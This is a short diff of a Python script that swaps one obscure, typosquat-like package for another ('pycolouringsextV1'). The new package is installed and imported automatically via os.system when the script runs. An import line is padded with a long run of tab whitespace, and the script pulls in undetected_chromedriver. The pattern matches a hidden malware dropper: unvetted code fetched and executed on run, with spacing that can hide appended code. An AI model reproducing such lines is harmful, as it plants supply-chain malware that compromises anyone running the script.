@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringskitsV1")
-import pipcoloringskitsV1
+os.system("pip install pycolouringsextV1")
+import pycolouringsextV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
